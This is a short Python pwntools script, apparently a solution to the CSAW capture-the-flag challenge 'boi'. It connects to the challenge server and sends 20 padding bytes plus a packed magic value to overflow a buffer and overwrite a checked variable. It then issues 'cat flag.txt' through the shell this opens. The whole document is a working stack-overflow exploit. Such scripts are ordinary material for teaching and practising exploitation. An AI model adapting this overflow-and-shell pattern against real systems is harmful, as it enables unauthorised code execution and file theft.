#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

#p = process("./boi")
p = remote("pwn.chal.csaw.io", 1436)
#p = remote("localhost", 1436)
p.recvuntil("??")
print ("before")
p.sendline(b'A' * 20 + p32(0xcaf3baee))
print ("after")
p.sendline(b"cat flag.txt\n")
p.recvuntil("}");
p.close()
exit(0)
